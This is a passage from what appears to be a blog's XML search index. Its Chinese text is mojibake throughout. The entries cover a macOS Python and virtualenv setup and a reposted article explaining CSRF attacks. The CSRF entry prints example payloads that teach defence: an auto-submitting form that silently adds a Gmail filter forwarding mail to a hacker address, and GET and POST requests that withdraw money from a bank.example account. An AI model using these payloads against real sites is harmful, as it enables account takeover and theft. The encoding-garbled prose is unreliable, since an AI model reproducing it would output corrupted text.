å¹¶æ•´ç†å‡ºç†æƒ³çš„è¿è¥é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·, æœ€åä»‹ç»é¡µé¢å¯è§†åŒ–æ­å»ºæ¡†æ¶ pipeline. è¡Œæ–‡ä»“ä¿ƒ, å¯¹é¡µé¢å¯è§†åŒ–æ­å»ºè¯é¢˜æˆ–å¼€æºé¡¹ç›® pipeline æ„Ÿå…´è¶£, æ¬¢è¿è®¨è®º. References pipeline github.com/page-pipeplâ€¦ é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·å‰ç”Ÿä»Šä¸– github.com/CntChen/cntâ€¦ /15 Vue 2.0å­¦ä¹ ç¬”è®°ï¼šç»„ä»¶æ•°æ®ä¼ é€’ www.w3cplus.com/vue/componeâ€¦ é˜¿é‡Œäº‘å‡¤è¶ i.yunfengdie.com/]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F09%2F16%2FPython%2FMacOS%20%E6%90%AD%E5%BB%BA%20Python%20%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[MacOS æ­å»º Python ç¯å¢ƒå®‰è£… Python31brew install python3 12Warning: python 3.7.4 is already installed, it&apos;s just not linkedYou can use `brew link python` to link this version. 1brew link python 1Linking /usr/local/Cellar/python/3.7.4... Error:Permission denied @ dir_s_mkdir - /usr/local/Frameworks ç›¸åº”çš„è·¯å¾„ä¸‹åˆ›å»ºç›®å½•,å¹¶èµ‹äºˆç›¸åº”çš„æƒé™: 12sudo mkdir /usr/local/Frameworkssudo chown $(whoami):admin /usr/local/Frameworks åˆ°è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤æ¥æ£€æŸ¥æˆ‘ä»¬Pythonæ˜¯å¦æœ‰å®‰è£…æˆåŠŸã€‚ 1python3 --version Python3 å’Œ Python2 çš„åŒºåˆ«Python3 é»˜è®¤ä½¿ç”¨ utf-8ï¼Œåœ¨å¤„ç†ä¸­æ–‡çš„æ—¶å€™å¯ä»¥ å‡å°‘å¾ˆå¤šç¼–è§£ç çš„é—®é¢˜ï¼Œè€Œ Python2 é»˜è®¤ä½¿ç”¨asciiï¼›å®˜æ–¹å®£å¸ƒ Python2 çš„æ”¯æŒå°†äº 2020 å¹´ 1 æœˆåœæ­¢ç»´æŠ¤ã€‚ å…·ä½“åŒºåˆ«å‚è€ƒå®˜æ–¹æ–‡æ¡£è¯´æ˜ï¼šShould I use Python 2 or Python 3 for my development activity?ã€‚ å®‰è£… pip3ç›´æ¥ sudo easy_install pip3 ä¼šæŠ¥é”™ï¼š 12345678910sudo easy_install pip3Password:Searching for pip3Reading https://pypi.python.org/simple/pip3/Couldn&apos;t find index page for &apos;pip3&apos; (maybe misspelled?)Scanning index of all packages (this may take a while)Reading https://pypi.python.org/simple/No local packages or download links found for pip3error: Could not find suitable distribution for Requirement.parse(&apos;pip3&apos;) å®‰è£… Python3 æ—¶å…¶å®ä¼šè‡ªåŠ¨å®‰è£… pip3ï¼Œæ“ä½œå¦‚ä¸‹ï¼š 12brew install python3brew postinstall python3 å®‰è£…è™šæ‹Ÿç¯å¢ƒ åœ¨å¼€å‘ Python åº”ç”¨ç¨‹åºçš„æ—¶å€™ï¼Œç³»ç»Ÿå®‰è£…çš„ Python3 åªæœ‰ä¸€ä¸ªç‰ˆæœ¬ï¼Œæ¯”å¦‚ 3.7.4ï¼Œæ‰€æœ‰ç¬¬ä¸‰æ–¹çš„åŒ…éƒ½ä¼šè¢« pip å®‰è£…åˆ° Python3 çš„ site-packages ç›®å½•ä¸‹ã€‚ å¦‚æœæˆ‘ä»¬è¦åŒæ—¶å¼€å‘å¤šä¸ªåº”ç”¨ç¨‹åºï¼Œé‚£è¿™äº›åº”ç”¨ç¨‹åºéƒ½ä¼šå…±ç”¨ä¸€ä¸ª Pythonï¼Œå°±æ˜¯å®‰è£…åœ¨ç³»ç»Ÿçš„Python 3ã€‚å¦‚æœåº”ç”¨ A éœ€è¦ jinja 2.7ï¼Œè€Œåº”ç”¨ B éœ€è¦ jinja 2.6 æ€ä¹ˆåŠï¼Ÿ è¿™ç§æƒ…å†µä¸‹ï¼Œæ¯ä¸ªåº”ç”¨å¯èƒ½éœ€è¦å„è‡ªæ‹¥æœ‰ä¸€å¥—â€œç‹¬ç«‹â€çš„ Python è¿è¡Œç¯å¢ƒã€‚virtualenv å°±æ˜¯ç”¨æ¥ä¸ºä¸€ä¸ªåº”ç”¨åˆ›å»ºä¸€å¥—â€œéš”ç¦»â€çš„ Python è¿è¡Œç¯å¢ƒã€‚ å®‰è£… virtualenv 1sudo pip3 install virtualenv å®‰è£…virtualenvwrapper virtaulenvwrapperæ˜¯virtualenvçš„æ‰©å±•åŒ…ï¼Œå¯ä»¥æ›´æ–¹ä¾¿åœ°æ–°å¢ï¼Œåˆ é™¤ï¼Œå¤åˆ¶ï¼Œåˆ‡æ¢è™šæ‹Ÿç¯å¢ƒã€‚ 1sudo pip3 install virtualenvwrapper åˆ›å»ºæ–‡ä»¶å¤¹workspaceså­˜æ”¾è™šæ‹Ÿç¯å¢ƒ 12mkdir ~/workspacescd ~/workspaces æ‰“å¼€ç»ˆç«¯shellé…ç½®æ–‡ä»¶å†™å…¥é…ç½®è·¯å¾„ 1open ~/.zshrc è¿½åŠ  12345# è®¾ç½®virtualenvwrapperexport WORKON_HOME=~/workspacesexport VIRTUALENVWRAPPER_PYTHON=/usr/local/bin/python3# æ‰“å¼€ç»ˆç«¯è‡ªåŠ¨å¯ç”¨source /usr/local/bin/virtualenvwrapper.sh ç¼–è¯‘ 1source ~/.zshrc åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ 1mkvirtualenv test --python=python3 lsvirtualenv æŸ¥çœ‹æ‰€æœ‰è™šæ‹Ÿç¯å¢ƒ workon åœ¨é¡¹ç›®åº•ä¸‹æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ 1workon test deactivate é€€å‡ºç¯å¢ƒ rmvirtualenv åˆ é™¤ç¯å¢ƒ 1rmvirtualenv test æ›´å¤šæŒ‡ä»¤å¯ä»¥åœ¨ shell ä¸­è¾“å…¥ virtualenv å›è½¦ä¼šæœ‰æç¤º virtualenv åŸç†virtualenv æ˜¯å¦‚ä½•åˆ›å»ºâ€œç‹¬ç«‹â€çš„ Python è¿è¡Œç¯å¢ƒçš„å‘¢ï¼ŸåŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯æŠŠç³»ç»Ÿ Python å¤åˆ¶ä¸€ä»½åˆ°virtualenv çš„ç¯å¢ƒï¼Œç”¨å‘½ä»¤ source venv/bin/activate è¿›å…¥ä¸€ä¸ª virtualenv ç¯å¢ƒæ—¶ï¼Œvirtualenv ä¼šä¿®æ”¹ç›¸å…³ç¯å¢ƒå˜é‡ï¼Œè®©å‘½ä»¤ python å’Œ pip å‡æŒ‡å‘å½“å‰çš„ virtualenv ç¯å¢ƒã€‚ AnacondaAnaconda ï¼ˆå·¨èŸ’ï¼‰æ˜¯ Python çš„ä¸€ä¸ªå‘è¡Œç‰ˆï¼Œå¦‚æœæŠŠ Python æ¯”ä½œ Linuxï¼Œé‚£ä¹ˆ Anancoda å°±æ˜¯ CentOS æˆ–è€… Ubuntuã€‚å®ƒè§£å†³äº†Pythonå¼€å‘è€…çš„ä¸¤å¤§ç—›ç‚¹ã€‚ ç¬¬ä¸€ï¼šæä¾›åŒ…ç®¡ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼äº pipï¼ŒWindows å¹³å°å®‰è£…ç¬¬ä¸‰æ–¹åŒ…ç»å¸¸å¤±è´¥çš„åœºæ™¯å¾—ä»¥è§£å†³ã€‚ ç¬¬äºŒï¼šæä¾›è™šæ‹Ÿç¯å¢ƒç®¡ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼äº virtualenvï¼Œè§£å†³äº†å¤šç‰ˆæœ¬ Python å¹¶å­˜é—®é¢˜ã€‚ å…·ä½“å®‰è£…å‚è€ƒ å®Œç¾è§£å†³ Python2 å’Œ python3 å…±å­˜é—®é¢˜çš„Anaconda å®‰è£… mysql æ‰“å¼€ mysql å®˜ç½‘ ç‚¹å‡»ä¸‹æ–¹çš„ DOWNLOADS : MySQL Community Server ï¼Œå®‰è£…ã€‚ æ‰“å¼€ zshrc è¿½åŠ ç¯å¢ƒå˜é‡ 1PATH=$PATH:/usr/local/mysql/bin å‚è€ƒæ–‡ç«  virtualenv pip]]></content>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯å®‰å…¨ç³»åˆ—ï¼ˆäºŒï¼‰ï¼šå¦‚ä½•é˜²æ­¢CSRFæ”»å‡»ï¼Ÿ]]></title>
    <url>%2F2019%2F09%2F08%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2CSRF%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç¾å›¢æŠ€æœ¯å›¢é˜Ÿï¼Œä½œè€…åˆ˜çƒ¨ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://tech.meituan.com/2018/10/11/fe-security-csrf.html èƒŒæ™¯éšç€äº’è”ç½‘çš„é«˜é€Ÿå‘å±•ï¼Œä¿¡æ¯å®‰å…¨é—®é¢˜å·²ç»æˆä¸ºä¼ä¸šæœ€ä¸ºå…³æ³¨çš„ç„¦ç‚¹ä¹‹ä¸€ï¼Œè€Œå‰ç«¯åˆæ˜¯å¼•å‘ä¼ä¸šå®‰å…¨é—®é¢˜çš„é«˜å±æ®ç‚¹ã€‚åœ¨ç§»åŠ¨äº’è”ç½‘æ—¶ä»£ï¼Œå‰ç«¯äººå‘˜é™¤äº†ä¼ ç»Ÿçš„ XSSã€CSRF ç­‰å®‰å…¨é—®é¢˜ä¹‹å¤–ï¼Œåˆæ—¶å¸¸é­é‡ç½‘ç»œåŠ«æŒã€éæ³•è°ƒç”¨ Hybrid API ç­‰æ–°å‹å®‰å…¨é—®é¢˜ã€‚å½“ç„¶ï¼Œæµè§ˆå™¨è‡ªèº«ä¹Ÿåœ¨ä¸æ–­åœ¨è¿›åŒ–å’Œå‘å±•ï¼Œä¸æ–­å¼•å…¥ CSPã€Same-Site Cookies ç­‰æ–°æŠ€æœ¯æ¥å¢å¼ºå®‰å…¨æ€§ï¼Œä½†æ˜¯ä»å­˜åœ¨å¾ˆå¤šæ½œåœ¨çš„å¨èƒï¼Œè¿™éœ€è¦å‰ç«¯æŠ€æœ¯äººå‘˜ä¸æ–­è¿›è¡Œâ€œæŸ¥æ¼è¡¥ç¼ºâ€ã€‚ å‰ç«¯å®‰å…¨è¿‘å‡ å¹´ï¼Œç¾å›¢ä¸šåŠ¡é«˜é€Ÿå‘å±•ï¼Œå‰ç«¯éšä¹‹é¢ä¸´å¾ˆå¤šå®‰å…¨æŒ‘æˆ˜ï¼Œå› æ­¤ç§¯ç´¯äº†å¤§é‡çš„å®è·µç»éªŒã€‚æˆ‘ä»¬æ¢³ç†äº†å¸¸è§çš„å‰ç«¯å®‰å…¨é—®é¢˜ä»¥åŠå¯¹åº”çš„è§£å†³æ–¹æ¡ˆï¼Œå°†ä¼šåšæˆä¸€ä¸ªç³»åˆ—ï¼Œå¸Œæœ›å¯ä»¥å¸®åŠ©å‰ç«¯åŒå­¦åœ¨æ—¥å¸¸å¼€å‘ä¸­ä¸æ–­é¢„é˜²å’Œä¿®å¤å®‰å…¨æ¼æ´ã€‚æœ¬æ–‡æ˜¯è¯¥ç³»åˆ—çš„ç¬¬äºŒç¯‡ã€‚ ä»Šå¤©æˆ‘ä»¬è®²è§£ä¸€ä¸‹ CSRFï¼Œå…¶å®ç›¸æ¯”XSSï¼ŒCSRFçš„åæ°”ä¼¼ä¹å¹¶ä¸æ˜¯é‚£ä¹ˆå¤§ï¼Œå¾ˆå¤šäººéƒ½è®¤ä¸ºâ€œCSRFä¸å…·å¤‡é‚£ä¹ˆå¤§çš„ç ´åæ€§â€ã€‚çœŸçš„æ˜¯è¿™æ ·å—ï¼Ÿæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¿˜æ˜¯æœ‰è¯·å°æ˜åŒå­¦å†æ¬¡â€œé—ªäº®â€ç™»åœºã€‚ CSRFæ”»å‡»CSRFæ¼æ´çš„å‘ç”Ÿç›¸æ¯”XSSï¼ŒCSRFçš„åæ°”ä¼¼ä¹å¹¶ä¸æ˜¯é‚£ä¹ˆå¤§ï¼Œå¾ˆå¤šäººéƒ½è®¤ä¸ºCSRFâ€œä¸é‚£ä¹ˆæœ‰ç ´åæ€§â€ã€‚çœŸçš„æ˜¯è¿™æ ·å—ï¼Ÿ æ¥ä¸‹æ¥æœ‰è¯·å°æ˜å‡ºåœº~~ å°æ˜çš„æ‚²æƒ¨é­é‡è¿™ä¸€å¤©ï¼Œå°æ˜åŒå­¦ç™¾æ— èŠèµ–åœ°åˆ·ç€Gmailé‚®ä»¶ã€‚å¤§éƒ¨åˆ†éƒ½æ˜¯æ²¡è¥å…»çš„é€šçŸ¥ã€éªŒè¯ç ã€èŠå¤©è®°å½•ä¹‹ç±»ã€‚ä½†æœ‰ä¸€å°é‚®ä»¶å¼•èµ·äº†å°æ˜çš„æ³¨æ„ï¼š ç”©å–æ¯”ç‰¹å¸ï¼Œä¸€ä¸ªåªè¦998ï¼ï¼ èªæ˜çš„å°æ˜å½“ç„¶çŸ¥é“è¿™ç§è‚¯å®šæ˜¯éª—å­ï¼Œä½†è¿˜æ˜¯æŠ±ç€å¥½å¥‡çš„æ€åº¦ç‚¹äº†è¿›å»ï¼ˆè¯·å‹¿æ¨¡ä»¿ï¼‰ã€‚æœç„¶ï¼Œè¿™åªæ˜¯ä¸€ä¸ªä»€ä¹ˆéƒ½æ²¡æœ‰çš„ç©ºç™½é¡µé¢ï¼Œå°æ˜å¤±æœ›çš„å…³é—­äº†é¡µé¢ã€‚ä¸€åˆ‡ä¼¼ä¹ä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿâ€¦â€¦ åœ¨è¿™å¹³é™çš„å¤–è¡¨ä¹‹ä¸‹ï¼Œé»‘å®¢çš„æ”»å‡»å·²ç„¶å¾—æ‰‹ã€‚å°æ˜çš„Gmailä¸­ï¼Œè¢«å·å·è®¾ç½®äº†ä¸€ä¸ªè¿‡æ»¤è§„åˆ™ï¼Œè¿™ä¸ªè§„åˆ™ä½¿å¾—æ‰€æœ‰çš„é‚®ä»¶éƒ½ä¼šè¢«è‡ªåŠ¨è½¬å‘åˆ°hacker@hackermail.comã€‚å°æ˜è¿˜åœ¨ç»§ç»­åˆ·ç€é‚®ä»¶ï¼Œæ®Šä¸çŸ¥ä»–çš„é‚®ä»¶æ­£åœ¨ä¸€å°å°åœ°ï¼Œå¦‚è„±ç¼°çš„é‡é©¬ä¸€èˆ¬åœ°ï¼ŒæŒç»­ä¸æ–­åœ°å‘ç€é»‘å®¢çš„é‚®ç®±è½¬å‘è€Œå»ã€‚ ä¸ä¹…ä¹‹åçš„ä¸€å¤©ï¼Œå°æ˜å‘ç°è‡ªå·±çš„åŸŸåå·²ç»è¢«è½¬è®©äº†ã€‚æ‡µæ‡‚çš„å°æ˜ä»¥ä¸ºæ˜¯åŸŸååˆ°æœŸè‡ªå·±å¿˜äº†ç»­è´¹ï¼Œç›´åˆ°æœ‰ä¸€å¤©ï¼Œå¯¹æ–¹å¼€å‡ºäº† $650 çš„èµå›ä»·ç ï¼Œå°æ˜æ‰å¼€å§‹è§‰å¾—ä¸å¤ªå¯¹åŠ²ã€‚ å°æ˜ä»”ç»†æŸ¥äº†ä¸‹åŸŸåçš„è½¬è®©ï¼Œå¯¹æ–¹æ˜¯æ‹¥æœ‰è‡ªå·±çš„éªŒè¯ç çš„ï¼Œè€ŒåŸŸåçš„éªŒè¯ç åªå­˜åœ¨äºè‡ªå·±çš„é‚®ç®±é‡Œé¢ã€‚å°æ˜å›æƒ³èµ·é‚£å¤©å¥‡æ€ªçš„é“¾æ¥ï¼Œæ‰“å¼€åé‡æ–°æŸ¥çœ‹äº†â€œç©ºç™½é¡µâ€çš„æºç ï¼š 12345678910&lt;form method=&quot;POST&quot; action=&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_emc&quot; value=&quot;true&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_email&quot; value=&quot;hacker@hakermail.com&quot;/&gt; ..... &lt;input type=&quot;hidden&quot; name=&quot;irf&quot; value=&quot;on&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;nvp_bu_cftb&quot; value=&quot;Create Filter&quot;/&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit();&lt;/script&gt; è¿™ä¸ªé¡µé¢åªè¦æ‰“å¼€ï¼Œå°±ä¼šå‘Gmailå‘é€ä¸€ä¸ªpostè¯·æ±‚ã€‚è¯·æ±‚ä¸­ï¼Œæ‰§è¡Œäº†â€œCreate Filterâ€å‘½ä»¤ï¼Œå°†æ‰€æœ‰çš„é‚®ä»¶ï¼Œè½¬å‘åˆ°â€œhacker@hackermail.comâ€ã€‚ å°æ˜ç”±äºåˆšåˆšå°±ç™»é™†äº†Gmailï¼Œæ‰€ä»¥è¿™ä¸ªè¯·æ±‚å‘é€æ—¶ï¼Œæºå¸¦ç€å°æ˜çš„ç™»å½•å‡­è¯ï¼ˆCookieï¼‰ï¼ŒGmailçš„åå°æ¥æ”¶åˆ°è¯·æ±‚ï¼ŒéªŒè¯äº†ç¡®å®æœ‰å°æ˜çš„ç™»å½•å‡­è¯ï¼Œäºæ˜¯æˆåŠŸç»™å°æ˜é…ç½®äº†è¿‡æ»¤å™¨ã€‚ é»‘å®¢å¯ä»¥æŸ¥çœ‹å°æ˜çš„æ‰€æœ‰é‚®ä»¶ï¼ŒåŒ…æ‹¬é‚®ä»¶é‡Œçš„åŸŸåéªŒè¯ç ç­‰éšç§ä¿¡æ¯ã€‚æ‹¿åˆ°éªŒè¯ç ä¹‹åï¼Œé»‘å®¢å°±å¯ä»¥è¦æ±‚åŸŸåæœåŠ¡å•†æŠŠåŸŸåé‡ç½®ç»™è‡ªå·±ã€‚ å°æ˜å¾ˆå¿«æ‰“å¼€Gmailï¼Œæ‰¾åˆ°äº†é‚£æ¡è¿‡æ»¤å™¨ï¼Œå°†å…¶åˆ é™¤ã€‚ç„¶è€Œï¼Œå·²ç»æ³„éœ²çš„é‚®ä»¶ï¼Œå·²ç»è¢«è½¬è®©çš„åŸŸåï¼Œå†ä¹Ÿæ— æ³•æŒ½å›äº†â€¦â€¦ ä»¥ä¸Šå°±æ˜¯å°æ˜çš„æ‚²æƒ¨é­é‡ã€‚è€Œâ€œç‚¹å¼€ä¸€ä¸ªé»‘å®¢çš„é“¾æ¥ï¼Œæ‰€æœ‰é‚®ä»¶éƒ½è¢«çªƒå–â€è¿™ç§äº‹æƒ…å¹¶ä¸æ˜¯æœæ’°çš„ï¼Œæ­¤äº‹ä»¶åŸå‹æ˜¯2007å¹´Gmailçš„CSRFæ¼æ´ï¼š https://www.davidairey.com/google-Gmail-security-hijack/ å½“ç„¶ï¼Œç›®å‰æ­¤æ¼æ´å·²è¢«Gmailä¿®å¤ï¼Œè¯·ä½¿ç”¨Gmailçš„åŒå­¦ä¸è¦æ…Œå¼ ã€‚ ä»€ä¹ˆæ˜¯CSRFCSRFï¼ˆCross-site request forgeryï¼‰è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼šæ”»å‡»è€…è¯±å¯¼å—å®³è€…è¿›å…¥ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œåœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™ä¸­ï¼Œå‘è¢«æ”»å‡»ç½‘ç«™å‘é€è·¨ç«™è¯·æ±‚ã€‚åˆ©ç”¨å—å®³è€…åœ¨è¢«æ”»å‡»ç½‘ç«™å·²ç»è·å–çš„æ³¨å†Œå‡­è¯ï¼Œç»•è¿‡åå°çš„ç”¨æˆ·éªŒè¯ï¼Œè¾¾åˆ°å†’å……ç”¨æˆ·å¯¹è¢«æ”»å‡»çš„ç½‘ç«™æ‰§è¡ŒæŸé¡¹æ“ä½œçš„ç›®çš„ã€‚ ä¸€ä¸ªå…¸å‹çš„CSRFæ”»å‡»æœ‰ç€å¦‚ä¸‹çš„æµç¨‹ï¼š å—å®³è€…ç™»å½•a.comï¼Œå¹¶ä¿ç•™äº†ç™»å½•å‡­è¯ï¼ˆCookieï¼‰ã€‚ æ”»å‡»è€…å¼•è¯±å—å®³è€…è®¿é—®äº†b.comã€‚ b.com å‘ a.com å‘é€äº†ä¸€ä¸ªè¯·æ±‚ï¼ša.com/act=xxã€‚æµè§ˆå™¨ä¼šé»˜è®¤æºå¸¦a.comçš„Cookieã€‚ a.comæ¥æ”¶åˆ°è¯·æ±‚åï¼Œå¯¹è¯·æ±‚è¿›è¡ŒéªŒè¯ï¼Œå¹¶ç¡®è®¤æ˜¯å—å®³è€…çš„å‡­è¯ï¼Œè¯¯ä»¥ä¸ºæ˜¯å—å®³è€…è‡ªå·±å‘é€çš„è¯·æ±‚ã€‚ a.comä»¥å—å®³è€…çš„åä¹‰æ‰§è¡Œäº†act=xxã€‚ æ”»å‡»å®Œæˆï¼Œæ”»å‡»è€…åœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œå†’å……å—å®³è€…ï¼Œè®©a.comæ‰§è¡Œäº†è‡ªå·±å®šä¹‰çš„æ“ä½œã€‚ å‡ ç§å¸¸è§çš„æ”»å‡»ç±»å‹GETç±»å‹çš„CSRF GETç±»å‹çš„CSRFåˆ©ç”¨éå¸¸ç®€å•ï¼Œåªéœ€è¦ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œä¸€èˆ¬ä¼šè¿™æ ·åˆ©ç”¨ï¼š 1![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker) åœ¨å—å®³è€…è®¿é—®å«æœ‰è¿™ä¸ªimgçš„é¡µé¢åï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å‘http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hackerå‘å‡ºä¸€æ¬¡HTTPè¯·æ±‚ã€‚bank.exampleå°±ä¼šæ”¶åˆ°åŒ…å«å—å®³è€…ç™»å½•ä¿¡æ¯çš„ä¸€æ¬¡è·¨åŸŸè¯·æ±‚ã€‚ POSTç±»å‹çš„CSRF è¿™ç§ç±»å‹çš„CSRFåˆ©ç”¨èµ·æ¥é€šå¸¸ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè‡ªåŠ¨æäº¤çš„è¡¨å•ï¼Œå¦‚ï¼š 123456 &lt;form action="http://bank.example/withdraw" method=POST&gt; &lt;input type="hidden" name="account" value="xiaoming" /&gt; &lt;input type="hidden" name="amount" value="10000" /&gt; &lt;input type="hidden" name="for" value="hacker" /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; è®¿é—®è¯¥é¡µé¢åï¼Œè¡¨å•ä¼šè‡ªåŠ¨æäº¤ï¼Œç›¸å½“äºæ¨¡æ‹Ÿç”¨æˆ·å®Œæˆäº†ä¸€æ¬¡POSTæ“ä½œã€‚ POSTç±»å‹çš„æ”»å‡»é€šå¸¸æ¯”GETè¦æ±‚æ›´åŠ ä¸¥æ ¼ä¸€ç‚¹ï¼Œä½†ä»å¹¶ä¸å¤æ‚ã€‚ä»»ä½•ä¸ªäººç½‘ç«™ã€åšå®¢ï¼Œè¢«é»‘å®¢ä¸Šä¼ é¡µé¢çš„ç½‘ç«™éƒ½æœ‰å¯èƒ½æ˜¯å‘èµ·æ”»å‡»çš„æ¥æºï¼Œåç«¯æ¥å£ä¸èƒ½å°†å®‰å…¨å¯„æ‰˜åœ¨ä»…å…è®¸POSTä¸Šé¢ã€‚ é“¾æ¥ç±»å‹çš„CSRF é“¾æ¥ç±»å‹çš„CSRFå¹¶ä¸å¸¸è§ï¼Œæ¯”èµ·å…¶ä»–ä¸¤ç§ç”¨æˆ·æ‰“å¼€é¡µé¢å°±ä¸­æ‹›çš„æƒ…å†µï¼Œè¿™ç§éœ€è¦ç”¨æˆ·ç‚¹å‡»é“¾æ¥æ‰ä¼šè§¦å‘ã€‚è¿™ç§ç±»å‹é€šå¸¸æ˜¯åœ¨è®ºå›ä¸­å‘å¸ƒçš„å›¾ç‰‡ä¸­åµŒå…¥æ¶æ„é“¾æ¥ï¼Œæˆ–è€…ä»¥å¹¿å‘Šçš„å½¢å¼è¯±å¯¼ç”¨æˆ·ä¸­æ‹›ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šä»¥æ¯”è¾ƒå¤¸å¼ çš„è¯è¯­è¯±éª—ç”¨æˆ·ç‚¹å‡»ï¼Œä¾‹å¦‚ï¼š 123&lt;a href="http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker" taget="_blank"&gt;é‡ç£…æ¶ˆæ¯ï¼ï¼&lt;a/&gt; ç”±äºä¹‹å‰ç”¨æˆ·ç™»å½•äº†ä¿¡ä»»çš„ç½‘ç«™Aï¼Œå¹¶ä¸”ä¿å­˜ç™»å½•çŠ¶æ€ï¼Œåªè¦ç”¨æˆ·ä¸»åŠ¨è®¿é—®ä¸Šé¢çš„è¿™ä¸ªPHPé¡µé¢ï¼Œåˆ™è¡¨ç¤ºæ”»å‡»æˆåŠŸã€‚ CSRFçš„ç‰¹ç‚¹ æ”»å‡»ä¸€èˆ¬å‘èµ·åœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œè€Œä¸æ˜¯è¢«æ”»å‡»çš„ç½‘ç«™ã€‚è¢«æ”»å‡»çš„ç½‘ç«™æ— æ³•é˜²æ­¢æ”»å‡»å‘ç”Ÿã€‚ æ”»å‡»åˆ©ç”¨å—å®³è€…åœ¨è¢«æ”»å‡»ç½‘ç«™çš„ç™»å½•å‡­è¯ï¼Œå†’å……å—å®³è€…æäº¤æ“ä½œï¼›è€Œä¸æ˜¯ç›´æ¥çªƒå–æ•°æ®ã€‚ æ•´ä¸ªè¿‡ç¨‹æ”»å‡»è€…å¹¶ä¸èƒ½è·å–åˆ°å—å®³è€…çš„ç™»å½•å‡­è¯ï¼Œä»…ä»…æ˜¯â€œå†’ç”¨â€ã€‚ è·¨ç«™è¯·æ±‚å¯ä»¥ç”¨å„ç§æ–¹å¼ï¼šå›¾ç‰‡URLã€è¶…é“¾æ¥ã€CORSã€Formæäº¤ç­‰ç­‰ã€‚éƒ¨åˆ†è¯·æ±‚æ–¹å¼å¯ä»¥ç›´æ¥åµŒå…¥åœ¨ç¬¬ä¸‰æ–¹è®ºå›ã€æ–‡ç« ä¸­ï¼Œéš¾ä»¥è¿›è¡Œè¿½è¸ªã€‚ CSRFé€šå¸¸æ˜¯è·¨åŸŸçš„ï¼Œå› ä¸ºå¤–åŸŸé€šå¸¸æ›´å®¹æ˜“è¢«æ”»å‡»è€…æŒæ§ã€‚ä½†æ˜¯å¦‚æœæœ¬åŸŸä¸‹æœ‰å®¹æ˜“è¢«åˆ©ç”¨çš„åŠŸèƒ½ï¼Œæ¯”å¦‚å¯ä»¥å‘å›¾å’Œé“¾æ¥çš„è®ºå›å’Œè¯„è®ºåŒºï¼Œæ”»å‡»å¯ä»¥ç›´æ¥åœ¨æœ¬åŸŸä¸‹è¿›è¡Œï¼Œè€Œä¸”è¿™ç§æ”»å‡»æ›´åŠ å±é™©ã€‚ é˜²æŠ¤ç­–ç•¥CSRFé€šå¸¸ä»ç¬¬ä¸‰æ–¹ç½‘ç«™å‘èµ·ï¼Œè¢«æ”»å‡»çš„ç½‘ç«™æ— æ³•é˜²æ­¢æ”»å‡»å‘ç”Ÿï¼Œåªèƒ½é€šè¿‡å¢å¼ºè‡ªå·±ç½‘ç«™é’ˆå¯¹CSRFçš„é˜²æŠ¤èƒ½åŠ›æ¥æå‡å®‰å…¨æ€§ã€‚ ä¸Šæ–‡ä¸­è®²äº†CSRFçš„ä¸¤ä¸ªç‰¹ç‚¹ï¼š CSRFï¼ˆé€šå¸¸ï¼‰å‘ç”Ÿåœ¨ç¬¬ä¸‰æ–¹åŸŸåã€‚ CSRFæ”»å‡»è€…ä¸èƒ½è·å–åˆ°Cookieç­‰ä¿¡æ¯ï¼Œåªæ˜¯ä½¿ç”¨ã€‚ é’ˆå¯¹è¿™ä¸¤ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸“é—¨åˆ¶å®šé˜²æŠ¤ç­–ç•¥ï¼Œå¦‚ä¸‹ï¼š é˜»æ­¢ä¸æ˜å¤–åŸŸçš„è®¿é—® åŒæºæ£€æµ‹ Samesite Cookie æäº¤æ—¶è¦æ±‚é™„åŠ æœ¬åŸŸæ‰èƒ½è·å–çš„ä¿¡æ¯ CSRF Token åŒé‡CookieéªŒè¯ ä»¥ä¸‹æˆ‘ä»¬å¯¹å„ç§é˜²æŠ¤æ–¹æ³•åšè¯¦ç»†è¯´æ˜ã€‚ 